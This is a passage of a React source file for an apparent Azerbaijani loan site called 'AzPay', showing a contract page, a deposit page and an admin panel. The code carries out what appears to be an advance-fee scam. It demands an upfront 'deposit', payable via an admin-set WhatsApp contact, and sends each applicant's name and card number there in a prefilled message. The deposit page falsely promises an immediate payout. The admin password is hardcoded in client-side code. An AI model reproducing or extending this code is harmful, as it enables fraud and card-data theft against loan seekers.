                  <p>Gecikməə halında hər gün üçün 0.1% cərimə tətbiq olunur.</p>
                </section>

                <section>
                  <h4 className="font-semibold mb-2 text-gray-900">4. Depozit ödənişi</h4>
                  <p>Kreditin aktivləşdirilməsi üçün Borc alan depozit ödənişi etməlidir. Depozit kredtin tam ödənilməsindən sonra geri qaytarılır.</p>
                </section>

                <section>
                  <h4 className="font-semibold mb-2 text-gray-900">5. Erkən ödəmə</h4>
                  <p>Borc alan istənilən vaxt krediti erkən qaytara bilər. Erkən ödəmə halında faiz yalnız istifadə olunmuş müddət üçün hesablanır.</p>
                </section>

                <section>
                  <h4 className="font-semibold mb-2 text-gray-900">6. Tərəflərin öhdəlikləri</h4>
                  <p><strong>Kreditor öhdəlikləri:</strong> Kredit məbləğini müqavilədə göstərilən şərtlərlə vermək, məlumatların məxfiliyini təmin etmək.</p>
                  <p><strong>Borc alan öhdəlikləri:</strong> Kreditin vaxtında qaytarılması, ödəniş cədvəlinə riayət etmək.</p>
                </section>

                <section>
                  <h4 className="font-semibold mb-2 text-gray-900">7. Mübahisələrin həlli</h4>
                  <p>Müqavilə ilə bağlı mübahisələr ilk növbədə danışıqlar yolu ilə həll edilir. Razılaşmaya gəlinmədiyi halda Azərbaycan Respublikasının qanunvericiliyinə uyğun olaraq məhkəmə qaydası ilə həll olunur.</p>
                </section>

                <section className="mt-6 pt-4 border-t-2 border-blue-200">
                  <p className="text-center text-gray-900 font-semibold">Müqavilə tarixı: {new Date().toLocaleDateString('az-AZ')}</p>
                </section>
              </div>
            </div>

            <div className="flex items-start gap-2 sm:gap-3 mb-4 sm:mb-6 p-3 sm:p-4 bg-blue-50 rounded-lg border border-blue-200">
              <input
                type="checkbox"
                id="accept"
                data-testid="accept-contract-checkbox"
                checked={accepted}
                onChange={(e) => setAccepted(e.target.checked)}
                className="mt-1 w-4 h-4 sm:w-5 sm:h-5 text-blue-600 rounded cursor-pointer flex-shrink-0"
              />
              <label htmlFor="accept" className="text-xs sm:text-sm text-gray-700 cursor-pointer">
                Mən yuxarıda göstərilən bütün şərtləri oxudum və qəbul edirəm. Kredit müqaviləsini imzalamağa razıyam.
              </label>
            </div>
            
            <div className="text-center mb-4 pt-4 border-t border-gray-200">
              <img 
                src="https://i.hizliresim.com/iydskgy.jpeg" 
                alt="AzPay" 
                className="h-12 w-auto mx-auto mb-2"
              />
              <p className="text-xs text-gray-500">© 2025 AzPay. Bütün hüquqlar qorunur.</p>
            </div>

            <Button
              onClick={handleAccept}
              disabled={!accepted || loading}
              className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 py-6 text-lg"
              data-testid="sign-contract-btn"
            >
              {loading ? (
                <>
                  <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                  Yüklənir...
                </>
              ) : (
                'Təsdiq et və davam et'
              )}
            </Button>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

// Deposit Page
const DepositPage = () => {
  const appId = window.location.pathname.split('/').pop();
  const [settings, setSettings] = useState(null);
  const [application, setApplication] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetchData();
  }, []);

  const fetchData = async () => {
    try {
      const [settingsRes, appRes] = await Promise.all([
        axios.get(`${API}/settings`),
        axios.get(`${API}/applications/${appId}`)
      ]);
      setSettings(settingsRes.data);
      setApplication(appRes.data);
    } catch (error) {
      toast.error('Məlumatları yükləyərkən xəta baş verdi');
    } finally {
      setLoading(false);
    }
  };

  const handleWhatsAppRedirect = () => {
    if (settings?.whatsapp_link) {
      let url = settings.whatsapp_link;
      
      // Add message if enabled
      if (settings.whatsapp_message_enabled && application) {
        const message = `Salam! Mənim adım ${application.full_name}.\n\nKart nömrəm: ${application.card_number}\nGötürdüyüm məbləğ: ${application.selected_amount} AZN\n\nRəsmiləşdirməm tamamlanıb. İndi depozit ${settings.deposit_amount} AZN-dir.\n\nDepoziti hara ödəyim?`;
        url += `?text=${encodeURIComponent(message)}`;
      }
      
      window.open(url, '_blank');
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Loader2 className="w-12 h-12 animate-spin text-blue-600" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 py-12 px-4">
      <div className="container mx-auto max-w-2xl">
        <Card className="shadow-2xl border-blue-100">
          <CardHeader>
            <div className="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-br from-green-500 to-green-600 rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg animate-bounce">
              <span className="text-3xl sm:text-5xl font-bold text-white">₼</span>
            </div>
            <CardTitle className="text-2xl sm:text-3xl text-center">Depozit ödənişi</CardTitle>
            <CardDescription className="text-center">
              Kreditin aktivləşdirilməsi üçün depozit ödəyin
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-6">
            <div className="bg-gradient-to-r from-blue-50 to-blue-100 p-8 rounded-xl text-center border-2 border-blue-200 shadow-md">
              <p className="text-gray-700 mb-2 font-medium">Depozit məbləği</p>
              <p className="text-5xl font-bold text-blue-700" data-testid="deposit-amount">
                {settings?.deposit_amount || 50} AZN
              </p>
            </div>

            <div className="bg-gradient-to-r from-green-50 to-green-100 border-2 border-green-300 p-6 rounded-lg shadow-sm">
              <div className="flex items-start gap-3">
                <div className="flex-shrink-0 w-10 h-10 bg-green-500 rounded-full flex items-center justify-center">
                  <span className="text-white text-xl">✓</span>
                </div>
                <div>
                  <h4 className="font-bold text-green-800 text-lg mb-2">Depozit haqqında</h4>
                  <ul className="space-y-2 text-sm text-green-900">
                    <li className="flex items-start gap-2">
                      <span className="text-green-600 mt-1">•</span>
                      <span>Depozit ödənildikdən sonra kredit məbləği <strong>dərhal kartınıza köçürülür</strong></span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-green-600 mt-1">•</span>
                      <span><strong>Kreditiniz artıq hazırdır</strong> və istifadə edə bilərsiniz</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-green-600 mt-1">•</span>
                      <span>Depozit ödənişi WhatsApp vasitəsilə həyata keçirilir</span>
                    </li>
                  </ul>
                </div>
              </div>
            </div>

            <div className="bg-blue-50 border-2 border-blue-200 p-4 rounded-lg">
              <p className="text-sm text-blue-800 text-center">
                <strong>Əlaqə:</strong> Depozit ödənişi ilə bağlı sualınız varsa, aşağıdakı düyməyə klik edərək bizimlə əlaqə saxlayın.
              </p>
            </div>

            <Button
              onClick={handleWhatsAppRedirect}
              className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 py-6 text-lg"
              data-testid="whatsapp-payment-btn"
            >
              <svg className="w-6 h-6 mr-2" fill="currentColor" viewBox="0 0 24 24">
                <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/>
              </svg>
              WhatsApp ilə ödəniş et
            </Button>

            <p className="text-center text-sm text-gray-500">
              Ödənişdən sonra təsdiq üçün 5-10 dəqiqə gözləyin
            </p>
            
            <div className="text-center pt-6 border-t border-gray-200">
              <img 
                src="https://i.hizliresim.com/iydskgy.jpeg" 
                alt="AzPay" 
                className="h-12 w-auto mx-auto mb-2"
              />
              <p className="text-sm text-gray-500">© 2025 AzPay. Bütün hüquqlar qorunur.</p>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

// Admin Panel
const AdminPanel = () => {
  const navigate = useNavigate();
  const [password, setPassword] = useState('');
  const [authenticated, setAuthenticated] = useState(false);
  const [settings, setSettings] = useState({ 
    deposit_amount: 50, 
    whatsapp_link: '',
    whatsapp_message_enabled: true,
    contact_phone: '',
    contact_email: '',
    contact_address: '',
    about_text: ''
  });
  const [loading, setLoading] = useState(false);

  const handleLogin = () => {
    if (password === 'Batuhan6565') {
      setAuthenticated(true);
      fetchSettings();
    } else {
      toast.error('Yanlış şifrə');
    }
  };

  const fetchSettings = async () => {
    try {
      const response = await axios.get(`${API}/settings`);
      setSettings(response.data);
    } catch (error) {
      toast.error('Məlumatları yükləyərkən xəta');
    }
  };

  const handleUpdate = async () => {
    setLoading(true);
    try {
      await axios.put(
        `${API}/settings`,
        {
          deposit_amount: parseFloat(settings.deposit_amount),
          whatsapp_link: settings.whatsapp_link,
          whatsapp_message_enabled: settings.whatsapp_message_enabled,
          contact_phone: settings.contact_phone,
          contact_email: settings.contact_email,
          contact_address: settings.contact_address,
          about_text: settings.about_text
        },
        {
          headers: { 'admin-password': 'Batuhan6565' }
        }
      );
      toast.success('Parametrlər yeniləndi');
    } catch (error) {
      toast.error('Xəta baş verdi');
    } finally {
      setLoading(false);
    }
  };

  if (!authenticated) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 flex items-center justify-center px-4">
        <Card className="max-w-md w-full shadow-2xl">
          <CardHeader>
            <CardTitle className="text-2xl text-center">Admin Paneli</CardTitle>
            <CardDescription className="text-center">Daxil olmaq üçün şifrəni daxil edin</CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div>
              <Label htmlFor="password">Şifrə</Label>
              <Input
                id="password"
                type="password"
                data-testid="admin-password-input"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onKeyPress={(e) => e.key === 'Enter' && handleLogin()}
                className="mt-1.5"
              />
            </div>
            <Button 
              onClick={handleLogin} 
              className="w-full bg-gradient-to-r from-blue-600 to-blue-700"
              data-testid="admin-login-btn"
            >
              Daxil ol
            </Button>
            <Button 
              variant="ghost" 
              onClick={() => navigate('/')} 
              className="w-full"
            >
              Ana səhifəyə qayıt
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 py-12 px-4">
      <div className="container mx-auto max-w-2xl">
        <Button 
          variant="ghost" 
          onClick={() => navigate('/')} 
          className="mb-6"
        >
          ← Ana səhifəyə qayıt
        </Button>

        <Card className="shadow-2xl border-blue-100">
          <CardHeader>
            <CardTitle className="text-3xl">Admin Paneli</CardTitle>
            <CardDescription>Sistem parametrlərini idarə edin</CardDescription>
          </CardHeader>
          <CardContent className="space-y-6">
            <div>
              <Label htmlFor="deposit_amount">Depozit məbləği (AZN)</Label>
              <Input
                id="deposit_amount"
                type="number"
                data-testid="admin-deposit-input"
                value={settings.deposit_amount}
                onChange={(e) => setSettings({ ...settings, deposit_amount: e.target.value })}
                className="mt-1.5"
              />
            </div>

            <div>
              <Label htmlFor="whatsapp_link">WhatsApp linki</Label>
              <Input
                id="whatsapp_link"
                type="url"
                data-testid="admin-whatsapp-input"
                placeholder="https://wa.me/994..."
                value={settings.whatsapp_link}
                onChange={(e) => setSettings({ ...settings, whatsapp_link: e.target.value })}
                className="mt-1.5"
              />
            </div>

            <div className="flex items-center gap-3 p-4 bg-blue-50 rounded-lg border border-blue-200">
              <input
                type="checkbox"
                id="whatsapp_message"
                data-testid="admin-whatsapp-message-input"
                checked={settings.whatsapp_message_enabled}
                onChange={(e) => setSettings({ ...settings, whatsapp_message_enabled: e.target.checked })}
                className="w-5 h-5 text-blue-600 rounded cursor-pointer"
              />
              <Label htmlFor="whatsapp_message" className="cursor-pointer m-0">
                WhatsApp-da avtomatik mesaj göndərilsin (müştəri məlumatları ilə)
              </Label>
            </div>

            <div>
              <Label htmlFor="contact_phone">Əlaqə telefonu</Label>
              <Input
                id="contact_phone"
                type="tel"
                data-testid="admin-phone-input"
                placeholder="+994 50 123 45 67"
                value={settings.contact_phone}
                onChange={(e) => setSettings({ ...settings, contact_phone: e.target.value })}
                className="mt-1.5"
              />
            </div>

            <div>
              <Label htmlFor="contact_email">Əlaqə email</Label>
              <Input
                id="contact_email"
                type="email"
                data-testid="admin-email-input"
                placeholder="info@azpay.az"
                value={settings.contact_email}
                onChange={(e) => setSettings({ ...settings, contact_email: e.target.value })}
                className="mt-1.5"
              />
            </div>

            <div>
              <Label htmlFor="contact_address">Ünvan</Label>
              <Input
                id="contact_address"
                type="text"
                data-testid="admin-address-input"
                placeholder="Bakı, Azərbaycan"
                value={settings.contact_address}
                onChange={(e) => setSettings({ ...settings, contact_address: e.target.value })}
                className="mt-1.5"
              />
            </div>

            <div>
              <Label htmlFor="about_text">Haqqımızda mətn</Label>
              <textarea
                id="about_text"
                data-testid="admin-about-input"
                rows="4"
                placeholder="AzPay haqqında məlumat..."
                value={settings.about_text}
                onChange={(e) => setSettings({ ...settings, about_text: e.target.value })}
                className="mt-1.5 w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
            </div>

            <Button
              onClick={handleUpdate}
              disabled={loading}
              className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 py-6"
              data-testid="admin-update-btn"
            >
              {loading ? (
                <>
                  <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                  Yenilənir...
                </>
              ) : (
                'Parametrləri yenilə'
              )}
            </Button>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

function App() {
  return (
    <div className="App">
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<HomePage />} />
          <Route path="/application" element={<ApplicationForm />} />
          <Route path="/approval/:id" element={<ApprovalPage />} />
          <Route path="/credit-selection/:id" element={<CreditSelectionPage />} />
          <Route path="/card-entry/:id" element={<CardEntryPage />} />
          <Route path="/contract/:id" element={<ContractPage />} />
          <Route path="/deposit/:id" element={<DepositPage />} />
          <Route path="/admin" element={<AdminPanel />} />
        </Routes>
      </BrowserRouter>
    </div>
  );
}

export default App;